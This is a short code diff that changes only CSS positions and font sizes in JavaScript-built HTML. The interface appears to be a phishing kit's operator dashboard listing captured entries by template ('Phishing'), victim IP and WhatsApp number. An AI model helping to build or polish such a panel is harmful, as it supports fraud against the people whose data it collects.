@@ -474,7 +474,7 @@ const esWA_Codigo    = esWA_VipGroup || esWA_Advance;
         ">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
             <strong style="color:${borderColor};font-size:14px;">${v.template || "Phishing"}</strong>
-<small style="color:#fff;position:absolute;right:10px;font-size:15px;">${fecha}</small>
+<small style="color:#fff;position:absolute;right:29px;font-size:12px;">${fecha}</small>
         </div>`;
 
         if (v.ip) html += `<div>IP: <span style="color:#666;font-size:11px;">${v.ip}</span></div>`;
@@ -570,8 +570,8 @@ const esWA_Codigo    = esWA_VipGroup || esWA_Advance;
                 <div style="margin:6px 0;">
                     Número: <b style="color:#25D366;font-size:15px;">${v.numero}</b>
                <button onclick="navigator.clipboard.writeText('${v.numero}');mostrarNotif('✅ Número copiado')"
-    style="background:none;border:1px solid #25D366;color:#25D366;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;margin-left:6px;
-    position:relative;top:-4px;">
+    style="background:none;border:1px solid #25D366;color:#25D366;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;margin-left:195px;
+    position:relative;top:-29px;">
     Copiar
 </button>
                 </div>`;
